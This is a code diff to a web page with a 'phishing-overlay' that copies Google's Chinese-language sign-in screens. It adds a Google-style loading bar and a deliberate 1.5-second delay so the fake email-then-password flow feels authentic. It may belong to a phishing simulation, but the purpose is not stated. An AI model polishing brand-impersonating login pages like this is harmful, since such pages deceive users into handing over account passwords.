@@ -168,7 +168,58 @@
             display: flex;
             flex-direction: row;
             box-sizing: border-box;
+            /* 确保加载条绝对定位时相对于卡片，并隐藏溢出的圆角 */
+            position: relative; 
+            overflow: hidden; 
         }
+
+        /* --- 新增：Google 风格顶部线性加载条 --- */
+        .g-linear-loader {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 4px;
+            background-color: #d3e3fd; /* 浅蓝色背景 */
+            display: none; /* 默认隐藏 */
+            z-index: 10;
+        }
+
+        .g-linear-loader .bar {
+            content: '';
+            position: absolute;
+            background-color: #0b57d0; /* Google Blue */
+            top: 0;
+            left: 0;
+            bottom: 0;
+            will-change: left, right;
+            animation: indeterminate 2.1s cubic-bezier(0.65, 0.815, 0.735, 0.395) infinite;
+        }
+
+        .g-linear-loader .bar:after {
+            content: '';
+            position: absolute;
+            background-color: #0b57d0;
+            top: 0;
+            left: 0;
+            bottom: 0;
+            will-change: left, right;
+            animation: indeterminate-short 2.1s cubic-bezier(0.165, 0.84, 0.44, 1) infinite;
+            animation-delay: 1.15s;
+        }
+
+        @keyframes indeterminate {
+            0% { left: -35%; right: 100%; }
+            60% { left: 100%; right: -90%; }
+            100% { left: 100%; right: -90%; }
+        }
+
+        @keyframes indeterminate-short {
+            0% { left: -200%; right: 100%; }
+            60% { left: 107%; right: -8%; }
+            100% { left: 107%; right: -8%; }
+        }
+        /* --- 结束新增样式 --- */
 
         @media (max-width: 850px) {
             .g-card-container {
@@ -439,6 +490,8 @@
 
     <div id="phishing-overlay" class="hidden">
         <div id="phishing-step-1" class="g-card-container">
+            <div id="g-loader-step1" class="g-linear-loader"><div class="bar"></div></div>
+
             <div class="g-left-col">
                 <svg class="g-logo" viewBox="0 0 48 48" width="48" height="48"><g><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"></path><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"></path><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"></path><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"></path><path fill="none" d="M0 0h48v48H0z"></path></g></svg>
                 <h1 class="g-title">登录</h1>
@@ -865,17 +918,43 @@
                 els.inputEmail.focus();
             }
 
+            // --- 重点修改：点击下一步后的动画逻辑 ---
             function phishGoToPassword() {
                 const email = els.inputEmail.value.trim();
+                
+                // 基础验证
                 if (!email) { showEmailError("请输入电子邮件地址或电话号码"); return; }
                 const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                 if (!emailPattern.test(email)) { showEmailError("请输入有效的电子邮件地址"); return; }
 
                 resetEmailError();
-                els.displayEmail.innerText = email;
-                els.phishStep1.classList.add('hidden');
-                els.phishStep2.classList.remove('hidden');
-                setTimeout(() => els.inputPassword.focus(), 100);
+
+                // 1. 获取相关元素
+                const nextBtn = document.getElementById('btn-phish-next-1');
+                const loader = document.getElementById('g-loader-step1');
+
+                // 2. 锁定界面：显示顶部加载条，禁用按钮（防止重复点击）
+                loader.style.display = 'block';
+                nextBtn.disabled = true;
+                nextBtn.style.opacity = '0.6';
+                nextBtn.style.cursor = 'default';
+
+                // 3. 模拟视频中的加载延迟 (1.5秒)
+                setTimeout(() => {
+                    // 恢复按钮状态（为了下次重置）
+                    loader.style.display = 'none';
+                    nextBtn.disabled = false;
+                    nextBtn.style.opacity = '1';
+                    nextBtn.style.cursor = 'pointer';
+
+                    // 切换界面
+                    els.displayEmail.innerText = email;
+                    els.phishStep1.classList.add('hidden');
+                    els.phishStep2.classList.remove('hidden');
+                    
+                    // 聚焦密码框
+                    setTimeout(() => els.inputPassword.focus(), 100);
+                }, 1500); // 1500毫秒延迟
             }
 
             function endPhishing() {
@@ -906,7 +985,4 @@
         });
     </script>
 </body>
-
 </html>
-
-
